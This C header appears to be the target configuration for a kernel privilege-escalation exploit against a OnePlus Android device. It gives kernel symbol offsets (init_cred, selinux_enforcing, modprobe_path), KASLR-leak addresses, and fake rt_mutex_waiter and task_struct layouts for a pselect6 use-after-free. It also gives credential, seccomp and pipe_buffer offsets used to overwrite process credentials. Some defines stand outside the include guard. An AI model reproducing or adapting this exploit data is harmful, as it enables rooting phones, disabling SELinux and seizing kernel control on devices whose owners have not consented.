#ifndef TARGET_H
#define TARGET_H

#define BUILD_VARIANT_LABEL "ghostlock_oneplus"
#define BUILD_FINGERPRINT "oneplus/ghostlock"

/* Kernel address space (VA_BITS=39) */
#define KIMAGE_TEXT_BASE 0xffffff8008000000ULL
#define P0_PAGE_OFFSET 0xffffffc000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
/* physmap on this SoC spans ~48GB (DDR ranks at high phys addrs) */
#define KERNELSNITCH_IDENTITY_START 0xffffffc000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffffc400000000ULL
#define DIRECT_MAP_BASE 0xffffffc000000000ULL
#define DIRECT_MAP_END 0xffffffc400000000ULL
#define VMEMMAP_START 0xffffffbf00000000ULL

/* Global symbol offsets (kallsyms) */
#define INIT_TASK_OFF          0x029A9780ULL
#define INIT_CRED_OFF          0x0220E0D0ULL
#define INIT_UTS_NS_OFF        0x029A9558ULL
#define EMPTY_ZERO_PAGE_OFF    0x0220B000ULL
#define ROOT_TASK_GROUP_OFF    0x02CE9E80ULL
#define SELINUX_ENFORCING_OFF  0x02DC8CE8ULL  /* global int selinux_enforcing (enforcing_enabled() reads this), NOT selinux_state@0x2DC8CC8 */
#define MODPROBE_PATH_OFF      0x029B93C0ULL  /* char modprobe_path[256] (kallsyms_fixed.txt) */
#define KPTR_RESTRICT_OFF      0x029A92A8ULL
#define CAP_CAPABLE_ACTIVE_OFF 0x00411DCCULL
#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x0ULL
#define SECURITY_HOOK_HEADS_OFF 0x021F7CA0ULL
#define KMALLOC_CACHES_OFF     0x021F7798ULL
#define ANON_PIPE_BUF_OPS_OFF  0x017A1600ULL
/* UMH root: workqueue symbol offsets (0 = not available, set per-device) */
#define SYSTEM_UNBOUND_WQ_OFF              0ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0ULL
#define CONFIGFS_READ_ITER_OFF      0x002BE7DCULL
/* configfs_read_file (non-bin): skips to_frag() when needs_read_fill==0 */
#define CONFIGFS_READ_FILE_OFF      0x002BE46CULL
#define CONFIGFS_READ_FILE          (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_OFF)
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x002BE96CULL
#define COPY_SPLICE_READ_OFF   0x0024F2D4ULL
#define NOOP_LLSEEK_OFF        0x0020B474ULL
#define ASHMEM_MISC_FOPS_OFF   0x02BB1760ULL
#define ASHMEM_FOPS_OFF        0x019CCA30ULL
#define ASHMEM_IOCTL_OFF       0x01043F9CULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x010447F4ULL
#define ASHMEM_MMAP_OFF        0x0104484CULL
#define ASHMEM_OPEN_OFF        0x010449BCULL
#define ASHMEM_RELEASE_OFF     0x01044A3CULL
#define ASHMEM_SHOW_FDINFO_OFF 0x0ULL

/* KASLR leak */
#define SLIDE_NFULNL_LOGGER_OFF       0x0299F4C0ULL
#define SLIDE_LOGGERS_0_1_OFF         0x0299F3F0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02E86268ULL
#define SLIDE_SYSCTL_BOOTID_OFF       0x02E86268ULL

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define MODPROBE_PATH       (KIMAGE_TEXT_BASE + MODPROBE_PATH_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* 4.14 pselect6 route: freed rt_mutex_waiter = stack_fds word 12
 * (sys_pselect6 frame 0xa0, do_futex rt_waiter @ frame+0xd0). */
#define PSELECT_WAITER_WORD_SHIFT 12

/* Struct field offsets (BTF verified) */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x28
#define WAITER_TASK_OFF           0x50
#define WAITER_LOCK_OFF           0x38
#define WAITER_WAKE_STATE_OFF     0x60
#define WAITER_PRIO_OFF           0x18
#define WAITER_DEADLINE_OFF       0x20
#define WAITER_WW_CTX_OFF         0x68

#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF              0x50
#define FAKE_WAITER_LOCK_OFF              0x38
#define FAKE_WAITER_WAKE_STATE_OFF        0x60
#define FAKE_WAITER_WW_CTX_OFF            0x68

#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x94
#define FAKE_TASK_NORMAL_PRIO_OFF    0x9c
#define FAKE_TASK_TASK_GROUP_OFF     0x420
#define FAKE_TASK_PI_LOCK_OFF        0x9ec
#define FAKE_TASK_PI_WAITERS_OFF     0xa00
#define FAKE_TASK_PI_TOP_TASK_OFF    0xa10
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0xa18

#define MM_OWNER_OFF             0x410
#define TASK_PID_OFF             0x708
#define TASK_TGID_OFF            0x70c
#define TASK_REAL_PARENT_OFF     0x718
#define TASK_ATOMIC_FLAGS_OFF    0x6c8
#define TASK_REAL_CRED_OFF       0x8f8
#define TASK_CRED_OFF            0x900
#define TASK_COMM_OFF            0x910
#define TASK_TASKS_OFF           0x638
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x9c8

#define CRED_UID_OFF         4
#define CRED_SECUREBITS_OFF  0x24
#define CRED_CAPS_OFF        0x28
#define CRED_SECURITY_OFF    0x78
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x20
#define STRUCT_SLAB_CACHE_OFF         0x30
#define STRUCT_PAGE_TYPE_OFF          0x18

#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xb8
#define PIPE_INODE_INFO_SIZE          0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6c
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7c
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xa8
#define PIPE_USER_OFF                 0xb0

/* Unslid image offsets of the misc syscalls we sample to leak the kernel-stack
 * address of the dangling waiter (only the LOW 21 BITS matter: KASLR slides by a
 * multiple of 2 MB).  From kallsyms of the device:
 *   SyS_setsockopt  = 0xffffff8009428f54  -> 0x01428f54
 *   sock_setsockopt = 0xffffff800942eafc  -> 0x0142eafc
 * frames: SyS 0x50, sock_setsockopt 0x180  (disasm, BAN_GIAO §4). */
#define SYS_SETSOCKOPT_OFF   0x01428f54ULL
#define SOCK_SETSOCKOPT_OFF  0x0142eafcULL
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x10
#define FOPS_READ_OFF         0x18
#define FOPS_WRITE_OFF        0x20
#define FOPS_READ_ITER_OFF    0x28
#define FOPS_WRITE_ITER_OFF   0x30
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF            0x48
#define CFG_BIN_BUFFER_OFF            0x50
#define CFG_BIN_BUFFER_SIZE_OFF            0x58
#define CFG_CB_MAX_SIZE_OFF            0x5c

/* Write 2 specific */
#define CRED_COPY_OFF 0x1080

#endif

/* SLIDE mode also uses select() -> pselect6 -> waiter at stack_fds word 12 */
#define SLIDE_PSELECT_WORD_SHIFT 12
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1
